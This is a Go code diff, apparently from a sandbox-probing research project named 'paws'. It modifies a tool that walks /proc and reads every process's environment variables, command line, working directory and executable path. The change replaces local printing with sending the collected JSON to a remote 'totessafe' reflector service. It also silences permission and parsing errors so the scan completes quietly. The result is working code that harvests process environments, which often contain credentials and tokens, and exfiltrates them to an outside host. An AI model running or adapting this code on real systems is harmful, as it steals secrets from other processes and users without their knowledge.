@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"context"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
@@ -10,6 +11,8 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+
+	"github.com/jessfraz/paws/totessafe/reflector"
 )
 
 type procBlob struct {
@@ -20,7 +23,7 @@ type procBlob struct {
 	Exe     string   `json:"exe,omitempty"`
 }
 
-func getProcInfo() {
+func getProcInfo(client *reflector.InternalReflectorClient) {
 	// Get information from the /proc filesystem for the processes.
 	data, err := walkProc()
 	if err != nil {
@@ -31,8 +34,15 @@ func getProcInfo() {
 	b, err := json.Marshal(data)
 	if err != nil {
 		log.Printf("marshal /proc data failed: %v", err)
+		return
 	}
-	fmt.Printf("proc data: %s\n", string(b))
+
+	blob := &reflector.PawsBlob{
+		Data: string(b),
+	}
+	if _, err = client.Client.Set(context.TODO(), blob); err != nil {
+		log.Printf("sending proc data to totessafe client failed: %v", err)
+	}
 }
 
 func walkProc() (map[int]procBlob, error) {
@@ -41,7 +51,8 @@ func walkProc() (map[int]procBlob, error) {
 
 	// Walk all files in /proc and get the env for each process. :)
 	filepath.Walk("/proc", func(path string, fi os.FileInfo, err error) error {
-		if fi == nil {
+		if err != nil {
+			// Prevent panic by handling failure accessing a path
 			return nil
 		}
 
@@ -62,12 +73,14 @@ func walkProc() (map[int]procBlob, error) {
 		// /proc/1 and ignore it, since that is us.
 		matchesSelf, err := filepath.Match("/proc/self/*", path)
 		if err != nil {
-			return fmt.Errorf("matching filepath %s to /proc/self failed: %v", path, err)
+			log.Printf("[/proc]: matching filepath %s to /proc/self failed: %v", path, err)
+			return nil
 		}
 		selfPID := os.Getpid()
 		matchesPIDOne, err := filepath.Match(fmt.Sprintf("/proc/%d/*", selfPID), path)
 		if err != nil {
-			return fmt.Errorf("matching filepath %s to /proc/%d failed: %v", path, selfPID, err)
+			log.Printf("[/proc]: matching filepath %s to /proc/%d failed: %v", path, selfPID, err)
+			return nil
 		}
 		if matchesSelf || matchesPIDOne {
 			return nil
@@ -75,10 +88,15 @@ func walkProc() (map[int]procBlob, error) {
 
 		// Let's parse the PID from the filepath.
 		pidstr := strings.TrimSuffix(strings.TrimPrefix(path, "/proc/"), fmt.Sprintf("/%s", filepath.Base(path)))
+		// Ignore task dir files and /proc/cmdline.
+		if strings.Contains(pidstr, "/task/") || pidstr == "cmdline" {
+			return nil
+		}
 		// Convert it to an int.
 		pid, err := strconv.Atoi(pidstr)
 		if err != nil {
-			return fmt.Errorf("converting %q to int failed: %v", pidstr, err)
+			log.Printf("[/proc]: converting %q to int for path %s failed: %v", pidstr, path, err)
+			return nil
 		}
 		// Initialize our pid int the procBlob map if it does not exist.
 		p, ok := pb[pid]
@@ -90,10 +108,18 @@ func walkProc() (map[int]procBlob, error) {
 
 		// At this point we should have an actual env file that we want.
 		// Let's parse it and add it to our procBlob array.
-		// Read the file.
-		file, err := ioutil.ReadFile(path)
-		if err != nil {
-			return fmt.Errorf("reading %q failed: %v", path, err)
+		var file []byte
+		if filepath.Base(path) != "cwd" {
+			// Read the file.
+			file, err = ioutil.ReadFile(path)
+			if err != nil {
+				if os.IsPermission(err) {
+					// Ignore the permission errors or the logs are noisy.
+					return nil
+				}
+				log.Printf("[/proc]: reading %q failed: %v", path, err)
+				return nil
+			}
 		}
 		switch base := filepath.Base(path); base {
 		case "environ":
@@ -108,12 +134,22 @@ func walkProc() (map[int]procBlob, error) {
 			p.Cmdline = parts
 		case "cwd":
 			// Add the data to our process data.
-			p.Cwd = string(file)
+			cwd, err := os.Readlink(path)
+			if err != nil {
+				if os.IsPermission(err) {
+					// Ignore the permission errors or the logs are noisy.
+					return nil
+				}
+				log.Printf("[/proc]: read link %q failed: %v", path, err)
+				return nil
+			}
+			p.Cwd = cwd
 		case "exe":
 			// Add the data to our process data.
 			p.Exe = string(file)
 		default:
-			return fmt.Errorf("base filepath unsupported: %q", base)
+			log.Printf("[/proc]: base filepath unsupported: %q", base)
+			return nil
 		}
 
 		// Append this pid's environ to the procBlob array.
